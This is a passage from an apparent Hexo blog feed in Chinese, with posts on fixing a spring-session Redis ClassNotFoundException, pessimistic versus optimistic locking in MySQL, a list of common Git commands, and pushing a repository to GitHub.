class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-value</span>&gt;</span></span><br><span class="line">        /WEB-INF/spring/*.xml</span><br><span class="line">    <span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span></span><br><span class="line">        org.springframework.web.context.ContextLoaderListener</span><br><span class="line">    <span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当然，要在pom.xml上加上依赖包</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.session<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-session<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.3.0.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.session<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-session-data-redis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.3.0.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后…<br>就是报了异常</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.lang.ClassNotFoundException:com.lambdaworks.redis.AbstractRedisClient</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.lang.ClassNotFoundException:com.lambdaworks.redis.RedisException</span><br></pre></td></tr></table></figure><p>我知道是会有版本兼容的问题，所以不断切换版本试试看，然后就试了大半天，结果再一仔细看配置：知道<code>com.lambdaworks</code>是哪个包不：<code>io.lettuce</code>。所以的，其实是因为我使用的是jedis包，所以根本不需要这一行代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;bean <span class="class"><span class="keyword">class</span></span>=<span class="string">"org.springframework.data.redis.connection.lettuce.LettuceConnectionFactory"</span>/&gt;</span><br></pre></td></tr></table></figure><h1 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h1><p>因为我使用的是jedis包，而不是也不需要用到<code>io.lettuce</code>包，所以在<code>spring-context.xml</code>中配置应该是这样的：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Redis 线程池配置 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"jedisPoolConfig"</span> <span class="attr">class</span>=<span class="string">"redis.clients.jedis.JedisPoolConfig"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"maxTotal"</span> <span class="attr">value</span>=<span class="string">"$&#123;redis.pool.maxActive&#125;"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"maxIdle"</span> <span class="attr">value</span>=<span class="string">"$&#123;redis.pool.maxIdle&#125;"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"maxWaitMillis"</span> <span class="attr">value</span>=<span class="string">"$&#123;redis.pool.maxWaitMillis&#125;"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"testOnBorrow"</span> <span class="attr">value</span>=<span class="string">"$&#123;redis.pool.testOnBorrow&#125;"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"jedisConnFactory"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">class</span>=<span class="string">"org.springframework.data.redis.connection.jedis.JedisConnectionFactory"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"hostName"</span> <span class="attr">value</span>=<span class="string">"$&#123;redis.hostname&#125;"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">"$&#123;redis.password&#125;"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"port"</span> <span class="attr">value</span>=<span class="string">"$&#123;redis.port&#125;"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"usePool"</span> <span class="attr">value</span>=<span class="string">"$&#123;redis.usePool&#125;"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"poolConfig"</span> <span class="attr">ref</span>=<span class="string">"jedisPoolConfig"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- spring-session共享支持 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">context:annotation-config</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.springframework.session.data.redis.config.annotation.web.http.RedisHttpS</span></span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;花了大半天时间，解决了springMVC项目增加spring-session共享session报了异常 java.lang.ClassNotFoundException:com.lambdaworks.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;花了大半天时间，解决了springMVC项目增加spring-session共享session报了异常
    
    </summary>
    
      <category term="Spring" scheme="https://aunsetre.top/categories/Spring/"/>
    
    
      <category term="Spring-Session" scheme="https://aunsetre.top/tags/Spring-Session/"/>
    
  </entry>
  
  <entry>
    <title>深入理解乐观锁与悲观锁</title>
    <link href="https://aunsetre.top/2018/02/10/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E4%B9%90%E8%A7%82%E9%94%81%E4%B8%8E%E6%82%B2%E8%A7%82%E9%94%81/"/>
    <id>https://aunsetre.top/2018/02/10/深入理解乐观锁与悲观锁/</id>
    <published>2018-02-09T16:00:00.000Z</published>
    <updated>2018-05-24T03:34:53.604Z</updated>
    
    <content type="html"><![CDATA[<p>数据库管理系统（DBMS）中的并发控制的任务是确保在多个事务同时存取数据库中同一数据时不破坏事务的隔离性和统一性以及数据库的统一性。</p><p>乐观并发控制(乐观锁)和悲观并发控制（悲观锁）是并发控制主要采用的技术手段。</p><p>无论是悲观锁还是乐观锁，都是人们定义出来的概念，可以认为是一种思想。其实不仅仅是关系型数据库系统中有乐观锁和悲观锁的概念，像memcache、hibernate、tair等都有类似的概念。</p><p>针对于不同的业务场景，应该选用不同的并发控制方式。所以，不要把乐观并发控制和悲观并发控制狭义的理解为DBMS中的概念，更不要把他们和数据中提供的锁机制（行锁、表锁、排他锁、共享锁）混为一谈。其实，在DBMS中，悲观锁正是利用数据库本身提供的锁机制来实现的。</p><p>下面来分别学习一下悲观锁和乐观锁。     <a id="more"></a></p><h2 id="悲观锁"><a href="#悲观锁" class="headerlink" title="悲观锁"></a>悲观锁</h2><blockquote><p>在关系数据库管理系统里，悲观并发控制（又名“悲观锁”，Pessimistic Concurrency Control，缩写“PCC”）是一种并发控制的方法。它可以阻止一个事务以影响其他用户的方式来修改数据。如果一个事务执行的操作都某行数据应用了锁，那只有当这个事务把锁释放，其他事务才能够执行与该锁冲突的操作。<br>悲观并发控制主要用于数据争用激烈的环境，以及发生并发冲突时使用锁保护数据的成本要低于回滚事务的成本的环境中。</p></blockquote><p>悲观锁，正如其名，它指的是对数据被外界（包括本系统当前的其他事务，以及来自外部系统的事务处理）修改持保守态度(悲观)，因此，在整个数据处理过程中，将数据处于锁定状态。 悲观锁的实现，往往依靠数据库提供的锁机制 （也只有数据库层提供的锁机制才能真正保证数据访问的排他性，否则，即使在本系统中实现了加锁机制，也无法保证外部系统不会修改数据）</p><h3 id="在数据库中，悲观锁的流程如下："><a href="#在数据库中，悲观锁的流程如下：" class="headerlink" title="在数据库中，悲观锁的流程如下："></a>在数据库中，悲观锁的流程如下：</h3><blockquote><p>在对任意记录进行修改前，先尝试为该记录加上<a href="http://www.hollischuang.com/archives/923" target="_blank" rel="noopener">排他锁</a>（exclusive locking）。</p><p>如果加锁失败，说明该记录正在被修改，那么当前查询可能要等待或者抛出异常。 具体响应方式由开发者根据实际需要决定。</p><p>如果成功加锁，那么就可以对记录做修改，事务完成后就会解锁了。</p><p>其间如果有其他对该记录做修改或加排他锁的操作，都会等待我们解锁或直接抛出异常。</p></blockquote><h3 id="MySQL-InnoDB中使用悲观锁"><a href="#MySQL-InnoDB中使用悲观锁" class="headerlink" title="MySQL InnoDB中使用悲观锁"></a>MySQL InnoDB中使用悲观锁</h3><blockquote><p>要使用悲观锁，我们必须关闭mysql数据库的自动提交属性，因为MySQL默认使用autocommit模式，也就是说，当你执行一个更新操作后，MySQL会立刻将结果进行提交。<code>set autocommit=0;</code></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//0.开始事务</span><br><span class="line">begin;/begin work;/start transaction; (三者选一就可以)</span><br><span class="line">//1.查询出商品信息</span><br><span class="line">select status from t_goods where id=1 for update;</span><br><span class="line">//2.根据商品信息生成订单</span><br><span class="line">insert into t_orders (id,goods_id) values (null,1);</span><br><span class="line">//3.修改商品status为2</span><br><span class="line">update t_goods set status=2;</span><br><span class="line">//4.提交事务</span><br><span class="line">commit;/commit work;</span><br></pre></td></tr></table></figure><p>上面的查询语句中，我们使用了<code>select…for update</code>的方式，这样就通过开启<a href="http://www.hollischuang.com/archives/923" target="_blank" rel="noopener">排他锁</a>的方式实现了悲观锁。此时在t_goods表中，id为1的 那条数据就被我们锁定了，其它的事务必须等本次事务提交之后才能执行。这样我们可以保证当前的数据不会被其它事务修改。</p><blockquote><p>上面我们提到，使用<code>select…for update</code>会把数据给锁住，不过我们需要注意一些锁的级别，MySQL InnoDB默认<a href="http://www.hollischuang.com/archives/914" target="_blank" rel="noopener">行级锁</a>。行级锁都是基于索引的，如果一条SQL语句用不到索引是不会使用行级锁的，会使用表级锁把整张表锁住，这点需要注意。</p></blockquote><h3 id="优点与不足"><a href="#优点与不足" class="headerlink" title="优点与不足"></a>优点与不足</h3><p>悲观并发控制实际上是“先取锁再访问”的保守策略，为数据处理的安全提供了保证。但是在效率方面，处理加锁的机制会让数据库产生额外的开销，还有增加产生死锁的机会；另外，在只读型事务处理中由于不会产生冲突，也没必要使用锁，这样做只能增加系统负载；还有会降低了并行性，一个事务如果锁定了某行数据，其他事务就必须等待该事务处理完才可以处理那行数</p><h2 id="乐观锁"><a href="#乐观锁" class="headerlink" title="乐观锁"></a>乐观锁</h2><blockquote><p>在关系数据库管理系统里，乐观并发控制（又名“乐观锁”，Optimistic Concurrency Control，缩写“OCC”）是一种并发控制的方法。它假设多用户并发的事务在处理时不会彼此互相影响，各事务能够在不产生锁的情况下处理各自影响的那部分数据。在提交数据更新之前，每个事务会先检查在该事务读取数据后，有没有其他事务又修改了该数据。如果其他事务有更新的话，正在提交的事务会进行回滚。乐观事务控制最早是由孔祥重（H.T.Kung）教授提出。</p></blockquote><p>乐观锁（ Optimistic Locking ） 相对悲观锁而言，乐观锁假设认为数据一般情况下不会造成冲突，所以在数据进行提交更新的时候，才会正式对数据的冲突与否进行检测，如果发现冲突了，则让返回用户错误的信息，让用户决定如何去做。</p><p>相对于悲观锁，在对数据库进行处理的时候，乐观锁并不会使用数据库提供的锁机制。一般的实现乐观锁的方式就是记录数据版本。</p><blockquote><p>数据版本,为数据增加的一个版本标识。当读取数据时，将版本标识的值一同读出，数据每更新一次，同时对版本标识进行更新。当我们提交更新的时候，判断数据库表对应记录的当前版本信息与第一次取出来的版本标识进行比对，如果数据库表当前版本号与第一次取出来的版本标识值相等，则予以更新，否则认为是过期数据。</p></blockquote><p>实现数据版本有两种方式，第一种是使用版本号，第二种是使用时间戳。</p><h3 id="使用版本号实现乐观锁"><a href="#使用版本号实现乐观锁" class="headerlink" title="使用版本号实现乐观锁"></a>使用版本号实现乐观锁</h3><p>使用版本号时，可以在数据初始化时指定一个版本号，每次对数据的更新操作都对版本号执行+1操作。并判断当前版本号是不是该数据的最新的版本号。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.查询出商品信息</span><br><span class="line"><span class="keyword">select</span> (<span class="keyword">status</span>,<span class="keyword">status</span>,<span class="keyword">version</span>) <span class="keyword">from</span> t_goods <span class="keyword">where</span> <span class="keyword">id</span>=#&#123;<span class="keyword">id</span>&#125;</span><br><span class="line"><span class="number">2.</span>根据商品信息生成订单</span><br><span class="line"><span class="number">3.</span>修改商品<span class="keyword">status</span>为<span class="number">2</span></span><br><span class="line"><span class="keyword">update</span> t_goods </span><br><span class="line"><span class="keyword">set</span> <span class="keyword">status</span>=<span class="number">2</span>,<span class="keyword">version</span>=<span class="keyword">version</span>+<span class="number">1</span></span><br><span class="line"><span class="keyword">where</span> <span class="keyword">id</span>=#&#123;<span class="keyword">id</span>&#125; <span class="keyword">and</span> <span class="keyword">version</span>=#&#123;<span class="keyword">version</span>&#125;;</span><br></pre></td></tr></table></figure><h3 id="优点与不足-1"><a href="#优点与不足-1" class="headerlink" title="优点与不足"></a>优点与不足</h3><p>乐观并发控制相信事务之间的数据竞争(data race)的概率是比较小的，因此尽可能直接做下去，直到提交的时候才去锁定，所以不会产生任何锁和死锁。但如果直接简单这么做，还是有可能会遇到不可预期的结果，例如两个事务都读取了数据库的某一行，经过修改以后写回数据库，这时就遇到了问题。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;数据库管理系统（DBMS）中的并发控制的任务是确保在多个事务同时存取数据库中同一数据时不破坏事务的隔离性和统一性以及数据库的统一性。&lt;/p&gt;
&lt;p&gt;乐观并发控制(乐观锁)和悲观并发控制（悲观锁）是并发控制主要采用的技术手段。&lt;/p&gt;
&lt;p&gt;无论是悲观锁还是乐观锁，都是人们定义出来的概念，可以认为是一种思想。其实不仅仅是关系型数据库系统中有乐观锁和悲观锁的概念，像memcache、hibernate、tair等都有类似的概念。&lt;/p&gt;
&lt;p&gt;针对于不同的业务场景，应该选用不同的并发控制方式。所以，不要把乐观并发控制和悲观并发控制狭义的理解为DBMS中的概念，更不要把他们和数据中提供的锁机制（行锁、表锁、排他锁、共享锁）混为一谈。其实，在DBMS中，悲观锁正是利用数据库本身提供的锁机制来实现的。&lt;/p&gt;
&lt;p&gt;下面来分别学习一下悲观锁和乐观锁。
    
    </summary>
    
      <category term="MySql" scheme="https://aunsetre.top/categories/MySql/"/>
    
    
      <category term="SQL" scheme="https://aunsetre.top/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>Git常用命令</title>
    <link href="https://aunsetre.top/2018/02/05/Git%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <id>https://aunsetre.top/2018/02/05/Git常用命令/</id>
    <published>2018-02-04T16:00:00.000Z</published>
    <updated>2018-06-09T10:33:24.666Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://git-scm.com/images/branching-illustration@2x.png" alt="alt"></p><h2 id="创建版本库"><a href="#创建版本库" class="headerlink" title="创建版本库"></a>创建版本库</h2><p>在当前目录新建一个Git代码库</p><blockquote><p>$ git init</p></blockquote><p>新建一个目录，将其初始化为Git代码库</p><blockquote><p>$ git init [project-name]</p></blockquote><p>下载一个项目和它的整个代码历史<a id="more"></a></p><blockquote><font color="red">$ git clone [url]</font></blockquote><h2 id="添加-删除"><a href="#添加-删除" class="headerlink" title="添加/删除"></a>添加/删除</h2><p>添加指定文件到暂存区</p><blockquote><font color="red">$ git add [file1] [file2] …</font></blockquote><p>添加指定目录到暂存区，包括子目录</p><blockquote><font color="red">$ git add [dir]</font></blockquote><p>添加当前目录的所有文件到暂存区</p><blockquote><font color="red">$ git add .</font></blockquote><p>添加每个变化前，都会要求确认<br>对于同一个文件的多处变化，可以实现分次提交</p><blockquote><p>$ git add -p</p></blockquote><p>删除工作区文件，并且将这次删除放入暂存区</p><blockquote><p>$ git rm [file1] [file2] …</p></blockquote><p>停止追踪指定文件，但该文件会保留在工作区</p><blockquote><p>$ git rm –cached [file]</p></blockquote><p>改名文件，并且将这个改名放入暂存区</p><blockquote><p>$ git mv [file-original] [file-renamed]</p></blockquote><h2 id="提交"><a href="#提交" class="headerlink" title="提交"></a>提交</h2><p>提交暂存区到仓库区</p><blockquote><font color="red">$ git commit -m [message]</font></blockquote><p>提交暂存区的指定文件到仓库区</p><blockquote><p>$ git commit [file1] [file2] … -m [message]</p></blockquote><p>提交工作区自上次commit之后的变化，直接到仓库区</p><blockquote><p>$ git commit -a</p></blockquote><p>提交时显示所有diff信息</p><blockquote><p>$ git commit -v</p></blockquote><p>使用一次新的commit，替代上一次提交<br>如果代码没有任何新变化，则用来改写上一次commit的提交信息</p><blockquote><p>$ git commit –amend -m [message]</p></blockquote><p>重做上一次commit，并包括指定文件的新变化</p><blockquote><p>$ git commit –amend [file1] [file2] …</p></blockquote><h2 id="分支"><a href="#分支" class="headerlink" title="分支"></a>分支</h2><p>列出所有本地分支</p><blockquote><font color="red">$ git branch</font></blockquote><p>列出所有远程分支</p><blockquote><p>$ git branch -r</p></blockquote><p>列出所有本地分支和远程分支</p><blockquote><p>$ git branch -a</p></blockquote><p>新建一个分支，但依然停留在当前分支</p><blockquote><p>$ git branch [branch-name]</p></blockquote><p>新建一个分支，并切换到该分支</p><blockquote><p>$ git checkout -b [branch]</p></blockquote><p>新建一个分支，指向指定commit</p><blockquote><p>$ git branch [branch] [commit]</p></blockquote><p>新建一个分支，与指定的远程分支建立追踪关系</p><blockquote><p>$ git branch –track [branch] [remote-branch]</p></blockquote><p>切换到指定分支，并更新工作区</p><blockquote><p>$ git checkout [branch-name]</p></blockquote><p>切换到上一个分支</p><blockquote><p>$ git checkout -</p></blockquote><p>建立追踪关系，在现有分支与指定的远程分支之间</p><blockquote><p>$ git branch –set-upstream [branch] [remote-branch]</p></blockquote><p>合并指定分支到当前分支</p><blockquote><p>$ git merge [branch]</p></blockquote><p>选择一个commit，合并进当前分支</p><blockquote><p>$ git cherry-pick [commit]</p></blockquote><p>删除分支</p><blockquote><p>$ git branch -d [branch-name]</p></blockquote><p>删除远程分支</p><blockquote><p>$ git push origin –delete [branch-name]<br>$ git branch -dr [remote/branch]</p></blockquote><h2 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h2><p> 列出所有tag</p><blockquote><p>$ git tag</p></blockquote><p> 新建一个tag在当前commit</p><blockquote><p>$ git tag [tag]</p></blockquote><p> 新建一个tag在指定commit</p><blockquote><p>$ git tag [tag] [commit]</p></blockquote><p> 删除本地tag</p><blockquote><p>$ git tag -d [tag]</p></blockquote><p> 删除远程tag</p><blockquote><p>$ git push origin :refs/tags/[tagName]</p></blockquote><p> 查看tag信息</p><blockquote><p>$ git show [tag]</p></blockquote><p> 提交指定tag</p><blockquote><p>$ git push [remote] [tag]</p></blockquote><p> 提交所有tag</p><blockquote><p>$ git push [remote] –tags</p></blockquote><p> 新建一个分支，指向某个tag</p><blockquote><p>$ git checkout -b [branch] [tag]</p></blockquote><h2 id="查看信息"><a href="#查看信息" class="headerlink" title="查看信息"></a>查看信息</h2><p>显示有变更的文件</p><blockquote><font color="red">$ git status</font></blockquote><p>显示当前分支的版本历史</p><blockquote><p>$ git log</p></blockquote><p>显示commit历史，以及每次commit发生变更的文件</p><blockquote><p>$ git log –stat</p></blockquote><p>搜索提交历史，根据关键词</p><blockquote><p>$ git log -S [keyword]</p></blockquote><p>显示某个commit之后的所有变动，每个commit占据一行</p><blockquote><p>$ git log [tag] HEAD –pretty=format:%s</p></blockquote><p>显示某个commit之后的所有变动，其”提交说明”必须符合搜索条件</p><blockquote><p>$ git log [tag] HEAD –grep feature</p></blockquote><p>显示某个文件的版本历史，包括文件改名</p><blockquote><p>$ git log –follow [file]<br>$ git whatchanged [file]</p></blockquote><p>显示指定文件相关的每一次diff</p><blockquote><p>$ git log -p [file]</p></blockquote><p>显示过去5次提交</p><blockquote><p>$ git log -5 –pretty –oneline</p></blockquote><p>显示所有提交过的用户，按提交次数排序</p><blockquote><p>$ git shortlog -sn</p></blockquote><p>显示指定文件是什么人在什么时间修改过</p><blockquote><p>$ git blame [file]</p></blockquote><p>显示暂存区和工作区的代码差异</p><blockquote><p>$ git diff</p></blockquote><p>显示暂存区和上一个commit的差异</p><blockquote><p>$ git diff –cached [file]</p></blockquote><p>显示工作区与当前分支最新commit之间的差异</p><blockquote><p>$ git diff HEAD</p></blockquote><p>显示两次提交之间的差异</p><blockquote><p>$ git diff [first-branch]…[second-branch]</p></blockquote><p>显示今天你写了多少行代码</p><blockquote><font color="red">$ git diff –shortstat “@{0 day ago}”</font></blockquote><p>显示某次提交的元数据和内容变化</p><blockquote><p>$ git show [commit]</p></blockquote><p>显示某次提交发生变化的文件</p><blockquote><p>$ git show –name-only [commit]</p></blockquote><p>显示某次提交时，某个文件的内容</p><blockquote><p>$ git show [commit]:[filename]</p></blockquote><p>显示当前分支的最近几次提交</p><blockquote><p>$ git reflog</p></blockquote><p>从本地master拉取代码更新当前分支：branch 一般为master</p><blockquote><p>$ git rebase [branch]</p></blockquote><h2 id="同步"><a href="#同步" class="headerlink" title="同步"></a>同步</h2><p>下载远程仓库的所有变动</p><blockquote><p>$ git fetch [remote]</p></blockquote><p>显示所有远程仓库</p><blockquote><font color="red">$ git remote -v</font></blockquote><p>显示某个远程仓库的信息</p><blockquote><p>$ git remote show [remote]</p></blockquote><p>增加一个新的远程仓库，并命名</p><blockquote><p>$ git remote add [shortname] [url]</p></blockquote><p>取回远程仓库的变化，并与本地分支合并</p><blockquote><p>$ git pull [remote] [branch]</p></blockquote><p>上传本地指定分支到远程仓库</p><blockquote><p>$ git push [remote] [branch]</p></blockquote><p>强行推送当前分支到远程仓库，即使有冲突</p><blockquote><p>$ git push [remote] –force</p></blockquote><p>推送所有分支到远程仓库</p><blockquote><p>$ git push [remote] –all</p></blockquote><h2 id="恢复"><a href="#恢复" class="headerlink" title="恢复"></a>恢复</h2><p>恢复暂存区的指定文件到工作区</p><blockquote><p>$ git checkout [file]</p></blockquote><p>恢复某个commit的指定文件到暂存区和工作区</p><blockquote><p>$ git checkout [commit] [file]</p></blockquote><p>恢复暂存区的所有文件到工作区</p><blockquote><p>$ git checkout .</p></blockquote><p>重置暂存区的指定文件，与上一次commit保持一致，但工作区不变</p><blockquote><p>$ git reset [file]</p></blockquote><p>重置暂存区与工作区，与上一次commit保持一致</p><blockquote><p>$ git reset –hard</p></blockquote><p>重置当前分支的指针为指定commit，同时重置暂存区，但工作区不变</p><blockquote><p>$ git reset [commit]</p></blockquote><p>重置当前分支的HEAD为指定commit，同时重置暂存区和工作区，与指定commit一致</p><blockquote><p>$ git reset –hard [commit]</p></blockquote><p>重置当前HEAD为指定commit，但保持暂存区和工作区不变</p><blockquote><p>$ git reset –keep [commit]</p></blockquote><p>新建一个commit，用来撤销指定commit<br>后者的所有变化都将被前者抵消，并且应用到当前分支</p><blockquote><p>$ git revert [commit]</p></blockquote><p>暂时将未提交的变化移除，稍后再移入</p><blockquote><p>$ git stash<br>$ git stash pop</p></blockquote><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>生成一个可供发布的压缩包</p><blockquote><p>$ git archive</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://git-scm.com/images/branching-illustration@2x.png&quot; alt=&quot;alt&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;创建版本库&quot;&gt;&lt;a href=&quot;#创建版本库&quot; class=&quot;headerlink&quot; title=&quot;创建版本库&quot;&gt;&lt;/a&gt;创建版本库&lt;/h2&gt;&lt;p&gt;在当前目录新建一个Git代码库&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;$ git init&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;新建一个目录，将其初始化为Git代码库&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;$ git init [project-name]&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;下载一个项目和它的整个代码历史
    
    </summary>
    
      <category term="Git" scheme="https://aunsetre.top/categories/Git/"/>
    
    
      <category term="VersionContro" scheme="https://aunsetre.top/tags/VersionContro/"/>
    
  </entry>
  
  <entry>
    <title>使用Git推送仓库到Github</title>
    <link href="https://aunsetre.top/2018/02/05/%E9%80%9A%E8%BF%87git%E5%91%BD%E4%BB%A4%E8%A1%8C%E3%80%82/"/>
    <id>https://aunsetre.top/2018/02/05/通过git命令行。/</id>
    <published>2018-02-04T16:00:00.000Z</published>
    <updated>2018-06-11T01:59:46.936Z</updated>
    
    <content type="html"><![CDATA[<p>刚开始试着想将自己的代码上传至github上的时候真的是个小白，Google上面到处搜到处找资源。后来云里雾里的成功上传后，发现网络上介绍的大致有两种方法，一种方法是通过git命令行，另一种方法是通过下载Github客户端或第三方工具，很多IDE也集成了git的大部分功能。<br><a id="more"></a></p><h2 id="通过git命令行"><a href="#通过git命令行" class="headerlink" title="通过git命令行"></a>通过git命令行</h2><ul><li>ssh-keygen -t rsa -C “<a href="mailto:aunsetre@gmail.com" target="_blank" rel="noopener">aunsetre@gmail.com</a>“ //123 创建SSH Key</li><li>再去用户主目录里找到.ssh文件夹，里面有id_rsa和id_rsa.pub两个文件，这两个就是SSH Key的秘钥对，id_rsa是私钥，不能泄露，id_rsa.pub是公钥，可以公开。</li><li><p><img src="https://static.aunsetre.top/hexo/img/20180522083912.png" alt="github"></p></li><li><p>去创建仓库</p></li></ul><p><img src="https://static.aunsetre.top/hexo/img/1526882998944.png" alt="Github"><br>将仓库路径复制下来</p><p><img src="C:\Users\Aunse\AppData\Local\Temp\1526914794578.png" alt="1526914794578"></p><blockquote><p>git remote add origin <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>:flora0103/projects.git    //关联一个远程库命令，<br><a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>:flora0103/projects.git   这个是自己远程库<br>git push -u origin master    //关联后,第一次推送master分支的所有内容命令，此后，每次本地提交后，就可以使用命令git push origin master推送最新修改</p></blockquote><ul><li>初始化一个本地文件夹作为仓库<blockquote><p>git init 仓库文件夹名称<br>如我的就在命令行中输入:<br>git projects</p></blockquote></li></ul><p>首先要将你想上传的代码文件夹拖至这个新出现的仓库文件夹，然后在命令行输入:</p><blockquote><p>cd 仓库文件夹名称</p></blockquote><p>如我的就在命令行中输入:</p><blockquote><p>cd projects</p></blockquote><p>这时你命令行中的目录就会出现在你的仓库目录下。</p><p>接下来输入:</p><p>git add 你想上传的代码文件夹名称`</p><p>或者是输入:</p><blockquote><p>git add .</p></blockquote><p>(add后面的‘.’代表你仓库中的所有内容)</p><p>然后输入:</p><blockquote><p>git commit -m “你想交代的内容”</p></blockquote><p>最后输入:</p><blockquote><p>git push origin master</p></blockquote><p>一会儿后你就会在你github的仓库中看到你上传的代码文件夹啦。是不是都很简单呢！</p>]]></content>
    
    <summary type="html">
    
